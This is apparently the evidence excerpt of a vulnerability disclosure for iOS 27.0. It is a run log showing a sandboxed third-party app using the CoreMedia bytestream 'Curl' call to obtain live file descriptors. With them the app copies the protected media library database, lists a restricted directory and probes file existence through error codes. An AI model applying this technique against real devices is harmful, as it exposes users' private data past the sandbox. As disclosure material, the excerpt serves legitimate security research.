@@ -1,0 +1,64 @@
+=== CoreMedia bytestream PoC - iOS 27.0 (24A437) evidence excerpt ===
+Device: iPhone 17 Pro, iOS 27.0 (24A437), stock (not jailbroken).
+App: sandboxed third-party app, standard developer signing, no special entitlements.
+
+Note: lines below are quoted verbatim from the on-device run log (runs 'v410
+flight-7/8/9'), captured with the full instrumented build of this PoC; the attached
+minimal PoC is distilled from it and the 'Curl' create / fd chain below is identical.
+Unrelated probe lines are elided (no elisions inside any quoted line). Annotation
+strings are bilingual (English + Chinese); all data (paths, sizes, hex, error codes)
+is language-neutral. One unrelated third-party file name in a directory listing has
+been replaced with [redacted].
+
+--- Direct-open control: the app's own sandbox denies these same paths (errno 1) ---
+[+3s]   [v410] C0-medialib: 直读 ✗ errno=1 (Operation not permitted) — app 沙箱拒绝
+[+3s]   [v410] C0-itunesprefs-plist: 直读 ✗ errno=1 (Operation not permitted) — app 沙箱拒绝
+
+--- Origin handshake: fully permitted for an unprivileged client ---
+[+3s]   [v410] D1 '.rp1' 回复 type=dictionary
+[+3s]   [v410] D2x '.rp1' reply 内容: <dictionary: 0x122478800> { count = 4, transaction: 0, voucher = 0x0, contents =  "MemoryOriginServerToken" => <uint64: 0x1229fe640>: 482588858543045744  "MemoryOriginEndpoint" => <endpoint>  ".ProcessStateMonitorEndpoint" => <endpoint>  ".ErrorReturn" => <int64: 0x8c15cfc4e7b5348f>: 0 }
+[+3s]   [v410] D3 '.rp2' 回复 type=dictionary
+[+3s]   [v410] D3v '.rp2' reply: <dictionary: 0x122478400> { count = 1, transaction: 0, voucher = 0x0, contents =  ".ErrorReturn" => <int64: 0x8c15cfc4e7b5348f>: 0 }
+[+3s]   [v410] C1 '.org' begin st=0x00000000
+[+3s]   [v410] C2 '.org' 回复 type=dictionary
+[+3s]   [v410] C3 '.org' complete st=0x00000000 origin=true
+
+--- 'Curl' create -> ByteStreamDetails carries a live FileDescriptor ---
+[+3s]   [v410] F7-medialib-anchor: ★'Curl' OK oid=965211780001303553 len=0 dpid=0 (opts=0x0 reg=false)
+[+3s]   [v410] F7-medialib-anchor: details-full: <dictionary: 0x1225e8ae0> { count = 11, transaction: 0, voucher = 0x0, contents =  "ServerEndpoint" => <endpoint>  "ServerPIDVersion" => <int64: 0x8c15cfc4e7b5348f>: 0  "Writable" => <bool: 0x1e9f4d5a0>: false  "DoNotLogURLs" => <bool: 0x1e9f4d5a0>: false  "FileDescriptor" => <fd: 0x1229fd7a0> { type = (invalid descriptor), path = /private/var/mobile/Media/iTunes_Control/iTunes/MediaLibrary.sqlitedb }  "URL" => <dictionary: 0x1225e9a40> { count = 3, transaction: 0, voucher = 0x0, contents =   "com.apple.CFURL.magic" => <uuid: 0x122a10210> C3853DCC-9776-4114-B6C1-FD9F51944A6D   "com.apple.CFURL.string" => <string: 0x122a102a0> { string cache = 0x0, length = 76, contents = "file:///private/var/mobile/Media/iTunes_Control/iTunes/MediaLibrary.sqlitedb" }   "com.apple.CFURL.base" => <null: 0x1e9f4d900>: null-object  }  "EntireLengthAvailable" => <bool: 0x1e9f4d580>: true  "EntireLength" => <int64: 0x8c15cfc4e7d3348f>: 835584  "ObjectID" => <uint64: 0x1229fd3e0>: 965211780001303553  "ReadsMayBlockIndefinitely" => <bool: 0x1e9f4d5a0>: false  "ServerPID" => <int64: 0x8c15cfc4e7b55fa7>: 3429 }
+
+--- fd dup + read: full content copied into the app's container ---
+[+3s]   [v410] F7-medialib-anchor-detailsfd: ★★★FD-STOLEN fd=5 size=835584 uid=501 mode=100644 got=64 ★SQLite3 hex64=53514c69746520666f726d6174203300100002020040202000000007000000cc000000c700000003000001560000000400000000000000000000000100249f3c
+[+3s]   [v410] F7-medialib-anchor-detailsfd: ★EXFIL 835584B → Documents/v410_stolen_F7-medialib-anchor-detailsfd.bin
+[+3s]   [v410] R1-canary-reg-o0-detailsfd: ★★★FD-STOLEN fd=5 size=37 uid=501 mode=100644 got=37 ★CANARY hex64=563431302d43414e4152592d434f4e54454e542d414243444546313233343536373839300a
+[+3s]   [v410] R1-canary-reg-o0-detailsfd: ★EXFIL 37B → Documents/v410_stolen_R1-canary-reg-o0-detailsfd.bin
+[+3s]   [v410] F7-medialib-wal: details-full: <dictionary: 0x1225eab20> { count = 11, transaction: 0, voucher = 0x0, contents =  "ServerEndpoint" => <endpoint>  "ServerPIDVersion" => <int64: 0x8c15cfc4e7b5348f>: 0  "Writable" => <bool: 0x1e9f4d5a0>: false  "DoNotLogURLs" => <bool: 0x1e9f4d5a0>: false  "FileDescriptor" => <fd: 0x1229fd7a0> { type = (invalid descriptor), path = /private/var/mobile/Media/iTunes_Control/iTunes/MediaLibrary.sqlitedb-wal }  "URL" => <dictionary: 0x1225e92c0> { count = 3, transaction: 0, voucher = 0x0, contents =   "com.apple.CFURL.magic" => <uuid: 0x122a10420> C3853DCC-9776-4114-B6C1-FD9F51944A6D   "com.apple.CFURL.string" => <string: 0x122a10630> { string cache = 0x0, length = 80, contents = "file:///private/var/mobile/Media/iTunes_Control/iTunes/MediaLibrary.sqlitedb-wal" }   "com.apple.CFURL.base" => <null: 0x1e9f4d900>: null-object  }  "EntireLengthAvailable" => <bool: 0x1e9f4d580>: true  "EntireLength" => <int64: 0x8c15cfc4e766088f>: 1730432  "ObjectID" => <uint64: 0x1229fc7e0>: 965211780001303809  "ReadsMayBlockIndefinitely" => <bool: 0x1e9f4d5a0>: false  "ServerPID" => <int64: 0x8c15cfc4e7b55fa7>: 3429 }
+[+3s]   [v410] F7-medialib-wal-detailsfd: ★★★FD-STOLEN fd=5 size=1730432 uid=501 mode=100644 got=64 hex64=377f0682002de2180000100000000001ad545f90d875cfb3664657c0d2fda53d0000001f00000000ad545f90d875cfb3ef960907c47fad4a0d0d7000150c2e01
+[+3s]   [v410] F7-medialib-wal-detailsfd: ★EXFIL 1730432B → Documents/v410_stolen_F7-medialib-wal-detailsfd.bin
+[+3s]   [v410] F7-medialib-shm: details-full: <dictionary: 0x1225e8ae0> { count = 11, transaction: 0, voucher = 0x0, contents =  "ServerEndpoint" => <endpoint>  "ServerPIDVersion" => <int64: 0x8c15cfc4e7b5348f>: 0  "Writable" => <bool: 0x1e9f4d5a0>: false  "DoNotLogURLs" => <bool: 0x1e9f4d5a0>: false  "FileDescriptor" => <fd: 0x1229fd7a0> { type = (invalid descriptor), path = /private/var/mobile/Media/iTunes_Control/iTunes/MediaLibrary.sqlitedb-shm }  "URL" => <dictionary: 0x1225e9a40> { count = 3, transaction: 0, voucher = 0x0, contents =   "com.apple.CFURL.magic" => <uuid: 0x122a102a0> C3853DCC-9776-4114-B6C1-FD9F51944A6D   "com.apple.CFURL.string" => <string: 0x122a10210> { string cache = 0x0, length = 80, contents = "file:///private/var/mobile/Media/iTunes_Control/iTunes/MediaLibrary.sqlitedb-shm" }   "com.apple.CFURL.base" => <null: 0x1e9f4d900>: null-object  }  "EntireLengthAvailable" => <bool: 0x1e9f4d580>: true  "EntireLength" => <int64: 0x8c15cfc4e7b1348f>: 32768  "ObjectID" => <uint64: 0x1229fd3e0>: 965211780001304065  "ReadsMayBlockIndefinitely" => <bool: 0x1e9f4d5a0>: false  "ServerPID" => <int64: 0x8c15cfc4e7b55fa7>: 3429 }
+[+3s]   [v410] F7-medialib-shm-detailsfd: ★★★FD-STOLEN fd=5 size=32768 uid=501 mode=100644 got=64 hex64=18e22d00000000000800000001000010a4010000cc0000003a620b71f75250eaad545f90d875cfb3507edee21a3ccd4518e22d00000000000800000001000010
+[+3s]   [v410] F7-medialib-shm-detailsfd: ★EXFIL 32768B → Documents/v410_stolen_F7-medialib-shm-detailsfd.bin
+
+--- Auxiliary opcodes sealed on iOS 27.0 (error -16158): 'getL'/'read'/'cpy'/'fdsc'/'doom' ---
+[+3s]   [v410] F7-medialib-anchor: 'getL' len=0 | <dictionary: 0x122478800> { count = 2, transaction: 0, voucher = 0x0, contents =  ".ErrorReturn" => <int64: 0x8c6a303b184b339f>: -16158  ".Token" => <int64: 0x8c15cfc4e7b55fa7>: 3429 }
+[+3s]   [v410] F7-medialib-anchor: 'read' n=0 无data | <dictionary: 0x122478400> { count = 2, transaction: 0, voucher = 0x0, contents =  ".ErrorReturn" => <int64: 0x8c6a303b184b339f>: -16158  ".Token" => <int64: 0x8c15cfc4e7b55fa7>: 3429 }
+[+3s]   [v410] F7-medialib-anchor: 'cpy'[EntireLength] | <dictionary: 0x122478800> { count = 2, transaction: 0, voucher = 0x0, contents =  ".ErrorReturn" => <int64: 0x8c6a303b184b339f>: -16158  ".Token" => <int64: 0x8c15cfc4e7b55fa7>: 3429 }
+[+3s]   [v410] F7-medialib-anchor: 'cpy'[FileDescriptor] | <dictionary: 0x122478400> { count = 2, transaction: 0, voucher = 0x0, contents =  ".ErrorReturn" => <int64: 0x8c6a303b184b339f>: -16158  ".Token" => <int64: 0x8c15cfc4e7b55fa7>: 3429 }
+[+3s]   [v410] F7-medialib-anchor: ✗ 'fdsc' 无 fd | <dictionary: 0x122478800> { count = 2, transaction: 0, voucher = 0x0, contents =  ".ErrorReturn" => <int64: 0x8c6a303b184b339f>: -16158  ".Token" => <int64: 0x8c15cfc4e7b55fa7>: 3429 }
+[+3s]   [v410] F7-medialib-anchor: 'doom' reply type=dictionary | <dictionary: 0x122478400> { count = 2, transaction: 0, voucher = 0x0, contents =  ".ErrorReturn" => <int64: 0x8c6a303b184b339f>: -16158  ".Token" => <int64: 0x8c15cfc4e7b55fa7>: 3429 }
+
+--- Directory open -> directory fd -> readdir enumeration (mode 40755) ---
+[+3s]   [v410] F8-dir-itunes: ★'Curl' OK oid=965211780001304577 len=0 dpid=0 (opts=0x0 reg=false)
+[+3s]   [v410] F8-dir-itunes: details-full: <dictionary: 0x106215da0> { count = 11, transaction: 0, voucher = 0x0, contents =  "ServerEndpoint" => <endpoint>  "ServerPIDVersion" => <int64: 0xa63192e4047a98ff>: 0  "Writable" => <bool: 0x1e9f4d5a0>: false  "DoNotLogURLs" => <bool: 0x1e9f4d5a0>: false  "FileDescriptor" => <fd: 0x1091f99c0> { type = (invalid descriptor), path = /private/var/mobile/Media/iTunes_Control/iTunes }  "URL" => <dictionary: 0x106215e00> { count = 3, transaction: 0, voucher = 0x0, contents =   "com.apple.CFURL.magic" => <uuid: 0x109224210> C3853DCC-9776-4114-B6C1-FD9F51944A6D   "com.apple.CFURL.string" => <string: 0x1092242a0> { string cache = 0x0, length = 54, contents = "file:///private/var/mobile/Media/iTunes_Control/iTunes" }   "com.apple.CFURL.base" => <null: 0x1e9f4d900>: null-object  }  "EntireLengthAvailable" => <bool: 0x1e9f4d580>: true  "EntireLength" => <int64: 0xa63192e4047a95ff>: 416  "ObjectID" => <uint64: 0x1091fa740>: 965211780001304577  "ReadsMayBlockIndefinitely" => <bool: 0x1e9f4d5a0>: false  "ServerPID" => <int64: 0xa63192e4047af3d7>: 3429 }
+[+3s]   [v410] F8-dir-itunes-detailsfd: ★★★FD-STOLEN fd=5 size=416 uid=501 mode=40755 got=-1 hex64=
+[+3s]   [v410] F8-dir-itunes-detailsfd: ★★DIR-LIST entries=13 sorted=.,..,14707674157007005779-ContentTastePendingChanges.plist,7582748843747631706-ContentTastePendingChanges.plist,IC-Info.sidf,IC-Info.sidv,MediaLibrary.sqlitedb,MediaLibrary.sqlitedb-shm,MediaLibrary.sqlitedb-wal,PlayCounts.plist,PlayCounts.plist.cig,[redacted],iTunesSyncDeletes.plist
+
+--- Existence oracle: -12203 = exists but refused; -17913 = ENOENT ---
+[+3s]   [v410] F9-dir-itunesctl: ✗ 无 ByteStreamDetails | <dictionary: 0x106870400> { count = 2, transaction: 0, voucher = 0x0, contents =  ".ErrorReturn" => <int64: 0xa64e20e0f12ff54f>: -12203  ".Token" => <int64: 0xa631df1f0ed11ccf>: 3429 }
+[+3s]   [v410] F9-dir-artwork: ✗ 无 ByteStreamDetails | <dictionary: 0x106870c00> { count = 2, transaction: 0, voucher = 0x0, contents =  ".ErrorReturn" => <int64: 0xa64e20e0f12ca7df>: -17913  ".Token" => <int64: 0xa631df1f0ed11ccf>: 3429 }
+[+3s]   [v410] F9-dir-music: ✗ 无 ByteStreamDetails | <dictionary: 0x106870400> { count = 2, transaction: 0, voucher = 0x0, contents =  ".ErrorReturn" => <int64: 0xa64e20e0f12ca7df>: -17913  ".Token" => <int64: 0xa631df1f0ed11ccf>: 3429 }
+[+5s]   [v410] F9-exist-heic6: ✗ 无 ByteStreamDetails | <dictionary: 0x106870c00> { count = 2, transaction: 0, voucher = 0x0, contents =  ".ErrorReturn" => <int64: 0xa64e20e0f12ff54f>: -12203  ".Token" => <int64: 0xa631df1f0ed11ccf>: 3429 }
+[+5s]   [v410] F9-exist-heic9999: ✗ 无 ByteStreamDetails | <dictionary: 0x106870400> { count = 2, transaction: 0, voucher = 0x0, contents =  ".ErrorReturn" => <int64: 0xa64e20e0f12ca7df>: -17913  ".Token" => <int64: 0xa631df1f0ed11ccf>: 3429 }
+[+5s]   [v410] F9-exist-jpg9: ✗ 无 ByteStreamDetails | <dictionary: 0x106870c00> { count = 2, transaction: 0, voucher = 0x0, contents =  ".ErrorReturn" => <int64: 0xa64e20e0f12ff54f>: -12203  ".Token" => <int64: 0xa631df1f0ed11ccf>: 3429 }
+[+5s]   [v410] F9-exist-mov6: ✗ 无 ByteStreamDetails | <dictionary: 0x106870400> { count = 2, transaction: 0, voucher = 0x0, contents =  ".ErrorReturn" => <int64: 0xa64e20e0f12ff54f>: -12203  ".Token" => <int64: 0xa631df1f0ed11ccf>: 3429 }
+
